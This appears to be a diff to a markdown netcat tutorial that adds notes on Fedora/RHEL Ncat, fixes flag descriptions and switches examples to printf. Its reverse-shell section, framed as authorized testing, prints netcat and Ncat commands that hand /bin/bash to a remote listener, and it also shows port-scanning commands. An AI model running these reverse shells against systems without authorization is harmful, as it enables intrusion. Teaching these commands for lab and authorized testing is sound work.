@@ -36,7 +36,7 @@ Think of it like a pipe between two computers. On one end you listen, on the oth
 ---
 
 
-[↑ Goto TOC](#table-of-contents)
+[↑ Back to TOC](#table-of-contents)
 
 ## Installation
 
@@ -68,12 +68,14 @@ nc -h        # or
 nc --version
 ```
 
-> **Note:** There are multiple variants of netcat (see [Netcat Variants](#netcat-variants)). The examples in this guide use `netcat-openbsd` syntax, the most commonly available version on modern Linux systems.
+> **Note:** There are multiple variants of netcat (see [Netcat Variants](#netcat-variants)). The examples in this guide use `netcat-openbsd` syntax, the default on Debian/Ubuntu and macOS.
+>
+> **Fedora/RHEL:** the `nmap-ncat` package installs **Ncat**, and `nc` is a link to `ncat`. Most examples work unchanged, but some flags differ: port ranges, `-q`, and the meaning of `-w`. Look for the "Fedora/RHEL (ncat)" notes below. Check which one you have with `nc --version` (Ncat prints `Ncat: Version 7.92 ...`).
 
 ---
 
 
-[↑ Goto TOC](#table-of-contents)
+[↑ Back to TOC](#table-of-contents)
 
 ## Basic Syntax
 
@@ -96,7 +98,7 @@ nc -l 4444
 ---
 
 
-[↑ Goto TOC](#table-of-contents)
+[↑ Back to TOC](#table-of-contents)
 
 ## Common Flags
 
@@ -108,20 +110,23 @@ nc -l 4444
 | `-v` | Verbose output (use `-vv` for more detail) |
 | `-n` | Numeric only — skip DNS resolution |
 | `-z` | Zero-I/O mode — scan without sending data |
-| `-w [secs]` | Timeout for connections |
-| `-e [cmd]` | Execute a command on connection (not available in all versions) |
-| `-k` | Keep listening after a client disconnects (OpenBSD version) |
-| `-q [secs]` | Quit after EOF on stdin after a delay (traditional nc) |
+| `-w [secs]` | Timeout. OpenBSD nc: connect **and** idle timeout. Ncat: **connect** timeout only (use `-i`/`--idle-timeout` for idle) |
+| `-i [secs]` | Ncat: idle read/write timeout (in OpenBSD nc, `-i` is a delay between lines) |
+| `-e [cmd]` | Execute a command on connection. Ncat: `-e`/`--exec`; traditional nc: `-e`; **OpenBSD nc has no `-e`** |
+| `-c [cmd]` | Ncat: run a command through `/bin/sh` (`--sh-exec`). In OpenBSD nc, `-C` sends CRLF instead |
+| `-k` | Keep listening after a client disconnects; only valid together with `-l` (OpenBSD nc and Ncat) |
+| `-q [secs]` | Quit a set time after EOF on stdin (traditional nc and Debian's netcat-openbsd). **Ncat has no `-q`**: use `--send-only` (quit on EOF) instead |
+| `-N` | OpenBSD nc: shut down the network socket after EOF on stdin |
 
 ---
 
 
-[↑ Goto TOC](#table-of-contents)
+[↑ Back to TOC](#table-of-contents)
 
 ## Core Use Cases
 
 
-[↑ Goto TOC](#table-of-contents)
+[↑ Back to TOC](#table-of-contents)
 
 ### Testing Connectivity
 
@@ -141,6 +146,8 @@ If it fails:
 nc: connectx to google.com port 444 (tcp) failed: Connection refused
 ```
 
+With Ncat (Fedora/RHEL) the messages look like `Ncat: Connected to 142.250.0.0:443.` and `Ncat: Connection refused.` instead; the exit code is `0` on success and `1` on failure, which is handy in scripts.
+
 This is especially useful for diagnosing firewall rules — if you can't connect to a port that should be open, a firewall is likely blocking you.
 
 **Test multiple ports:**
@@ -148,10 +155,15 @@ This is especially useful for diagnosing firewall rules — if you can't connect
 nc -zv 192.168.1.1 20 21 22 80 443
 ```
 
+> **Fedora/RHEL (ncat):** Ncat accepts only **one** port per command (`Got more than one port specification`). Use a loop instead:
+> ```bash
+> for p in 20 21 22 80 443; do nc -zv -w1 192.168.1.1 "$p"; done
+> ```
+
 ---
 
 
-[↑ Goto TOC](#table-of-contents)
+[↑ Back to TOC](#table-of-contents)
 
 ### Port Scanning
 
@@ -171,14 +183,28 @@ Add a timeout so it doesn't hang on filtered ports:
 nc -znvw1 192.168.1.1 1-1000
 ```
 
+> **Fedora/RHEL (ncat):** Ncat does **not** support port ranges (`Invalid port number "1-1000"`). Ncat comes from the Nmap project, which expects you to scan with `nmap` instead:
+> ```bash
+> sudo dnf install nmap
+> nmap -p 1-1000 192.168.1.1
+> ```
+> For a handful of ports, use the `for` loop shown above.
+
 ---
 
 
-[↑ Goto TOC](#table-of-contents)
+[↑ Back to TOC](#table-of-contents)
 
 ### Chat Between Two Machines
 
 Netcat can function as a primitive real-time chat tool between two machines on the same network.
+
+> **Firewall note (Fedora/RHEL):** firewalld blocks incoming connections by default, so a remote machine can't reach your listener until you open the port. Open it only for as long as you need it:
+> ```bash
+> sudo firewall-cmd --add-port=5000/tcp      # runtime only, gone after reload/reboot
+> sudo firewall-cmd --remove-port=5000/tcp   # close it again when done
+> ```
+> Use `5000/udp` for UDP listeners. On Debian/Ubuntu with ufw: `sudo ufw allow 5000/tcp` and `sudo ufw delete allow 5000/tcp`. This applies to every listener example in this guide.
 
 **On Machine A (listener):**
 ```bash
@@ -195,7 +221,7 @@ Now anything you type on either machine appears on the other. Press `Ctrl+D` to 
 ---
 
 
-[↑ Goto TOC](#table-of-contents)
+[↑ Back to TOC](#table-of-contents)
 
 ### Transferring Files
 
@@ -233,15 +259,17 @@ cat bigfile.iso | pv | nc 192.168.1.10 5000
 ---
 
 
-[↑ Goto TOC](#table-of-contents)
+[↑ Back to TOC](#table-of-contents)
 
 ### Setting Up a Simple Server
 
 You can use netcat to serve a file over HTTP — useful for quickly sharing something over a local network.
 
 ```bash
-{ echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n"; cat myfile.txt; } | nc -l -p 8080
+{ printf 'HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nConnection: close\r\n\r\n'; cat myfile.txt; } | nc -l -p 8080
 ```
+
+> **Why `printf`?** HTTP needs CRLF (`\r\n`) line endings. `echo -e` is not portable: `sh`/dash and macOS's `/bin/sh` print `-e` literally, and `echo` adds an extra newline. `printf` behaves the same everywhere.
 
 Then visit `http://<your-ip>:8080` in a browser to receive the file. Note this only serves a single request before exiting.
 
@@ -254,7 +282,7 @@ Then make a request to it and watch the raw HTTP headers come in.
 ---
 
 
-[↑ Goto TOC](#table-of-contents)
+[↑ Back to TOC](#table-of-contents)
 
 ### Banners and Service Fingerprinting
 
@@ -293,7 +321,7 @@ This manual approach helps you understand the raw protocols and is useful when d
 ---
 
 
-[↑ Goto TOC](#table-of-contents)
+[↑ Back to TOC](#table-of-contents)
 
 ### Reverse Shells (for Authorized Testing)
 
@@ -306,12 +334,17 @@ A reverse shell is when a target machine connects back to your machine and gives
 nc -l -p 4444 -vv
 ```
 
-**Target machine (connects back, traditional nc with -e):**
+**Target machine (connects back, traditional nc or Ncat with -e):**
 ```bash
 nc 192.168.1.100 4444 -e /bin/bash
+
+# Ncat (Fedora/RHEL) long form
+ncat --exec /bin/bash 192.168.1.100 4444
 ```
 
-If `-e` isn't available (OpenBSD netcat), use a named pipe instead:
+Ncat also has `-c`/`--sh-exec "command"`, which runs the command through `/bin/sh` (so pipes and redirects work).
+
+If `-e` isn't available (OpenBSD netcat, the default on Debian/Ubuntu and macOS), use a named pipe instead:
 
 ```bash
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.100 4444 > /tmp/f
@@ -322,7 +355,7 @@ Once connected, the attacker has an interactive shell on the target machine.
 ---
 
 
-[↑ Goto TOC](#table-of-contents)
+[↑ Back to TOC](#table-of-contents)
 
 ## UDP Mode
 
@@ -343,12 +376,14 @@ nc -u 192.168.1.10 5000
 nc -zuv 192.168.1.1 53
 ```
 
+> UDP "scans" with netcat are unreliable: no reply does not mean the port is open. Ncat reports `Connected` for any UDP port and only fails if an ICMP "port unreachable" comes back. For a real answer use `nmap -sU -p 53 192.168.1.1` (needs root), or a protocol tool such as `dig @192.168.1.1 example.com` for DNS.
+
 UDP is useful for testing DNS (port 53), SNMP (port 161), Syslog (port 514), and other UDP-based services.
 
 ---
 
 
-[↑ Goto TOC](#table-of-contents)
+[↑ Back to TOC](#table-of-contents)
 
 ## Netcat Variants
 
@@ -358,13 +393,15 @@ You'll encounter a few different versions of netcat in the wild. The commands ar
 The oldest version. Supports `-e` for executing commands. Found on older systems.
 
 **netcat-openbsd**
-The most common on modern Linux and macOS. Does not include `-e` for security reasons. Supports `-k` to keep listening. This is what most of this guide uses.
+The default on Debian/Ubuntu and macOS. Does not include `-e` for security reasons. Supports `-k` to keep listening. This is what most of this guide uses.
 
 **Ncat (from Nmap)**
-The most modern and feature-rich variant. Supports SSL (`--ssl`), proxies, and IPv6. Recommended when you need advanced features.
+The default on Fedora/RHEL (`nmap-ncat` package; `nc` → `ncat`). The most modern and feature-rich variant. Supports SSL (`--ssl`), proxies, IPv6, `--exec`/`--sh-exec`, `--allow` lists and `--broker`/`--chat` modes. Recommended when you need advanced features.
 ```bash
 ncat --ssl example.com 443
 ```
+
+Key differences from netcat-openbsd: one port per command (no ranges, so scan with `nmap`), no `-q` (use `--send-only`), `-w` is only a connect timeout (use `-i` for idle), and `-k` must be combined with `-l`.
 
 **GNU netcat**
 Similar to the original. Available on some Linux distros.
@@ -377,14 +414,15 @@ nc -h 2>&1 | head -5
 ---
 
 
-[↑ Goto TOC](#table-of-contents)
+[↑ Back to TOC](#table-of-contents)
 
 ## Tips and Tricks
 
-**Keep a listener alive across multiple connections (OpenBSD nc):**
+**Keep a listener alive across multiple connections (OpenBSD nc and Ncat):**
 ```bash
 nc -k -l -p 4444
 ```
+`-k` only works together with `-l`. Ncat also accepts several clients at the same time in this mode.
 
 **Send a UDP syslog message:**
 ```bash
@@ -393,7 +431,7 @@ echo "<34>Oct 11 22:14:15 mymachine su: test message" | nc -u 192.168.1.5 514
 
 **Check if a web server is alive without a browser:**
 ```bash
-echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc -w5 example.com 80
+printf 'HEAD / HTTP/1.0\r\nHost: example.com\r\n\r\n' | nc -w5 example.com 80
 ```
 
 **Quickly test SMTP by hand:**
@@ -414,7 +452,10 @@ QUIT
 ```bash
 nc -w3 192.168.1.1 80
 ```
-Netcat will exit after 3 seconds of inactivity.
+OpenBSD nc will exit after 3 seconds of inactivity. With Ncat (Fedora/RHEL), `-w3` only limits how long the **connection attempt** may take; for an idle timeout use `-i3`:
+```bash
+ncat -w3 -i3 192.168.1.1 80
+```
 
 **Pipe command output over the network:**
 ```bash
@@ -428,7 +469,7 @@ nc -l -p 5000
 ---
 
 
-[↑ Goto TOC](#table-of-contents)
+[↑ Back to TOC](#table-of-contents)
 
 ## Security Considerations
 
@@ -450,7 +491,7 @@ nc -l -p 4444 127.0.0.1
 ---
 
 
-[↑ Goto TOC](#table-of-contents)
+[↑ Back to TOC](#table-of-contents)
 
 ## Quick Reference Cheat Sheet
 
@@ -458,7 +499,7 @@ nc -l -p 4444 127.0.0.1
 # Test if port is open
 nc -zv host port
 
-# Scan port range
+# Scan port range (OpenBSD nc; with Ncat use: nmap -p 1-1000 host)
 nc -znvw1 host 1-1000
 
 # Listen on a port
@@ -478,7 +519,7 @@ tar cvf - /dir | nc host 5000       # sender
 nc -l -p 5000 | tar xvf -           # receiver
 
 # Grab HTTP banner
-echo -e "GET / HTTP/1.0\r\n\r\n" | nc host 80
+printf 'GET / HTTP/1.0\r\nHost: host\r\n\r\n' | nc host 80
 
 # Keep listener alive
 nc -k -l -p 4444
@@ -486,8 +527,11 @@ nc -k -l -p 4444
 # UDP mode
 nc -u host port
 
-# With timeout
+# With timeout (Ncat: -w = connect timeout, -i = idle timeout)
 nc -w5 host port
+
+# Send a file and quit on EOF (Ncat; OpenBSD nc: -N, traditional nc: -q 0)
+ncat --send-only host 5000 < file.txt
 
 # Verbose connection
 nc -vv host port
@@ -497,7 +541,7 @@ nc -vv host port
 
 *Netcat is a foundational tool for anyone learning networking, system administration, or security. The best way to get comfortable with it is to experiment in a safe lab environment — spin up two VMs or two terminals on the same machine and start connecting them.*
 
-[↑ Goto TOC](#table-of-contents)
+[↑ Back to TOC](#table-of-contents)
 
 ---
 
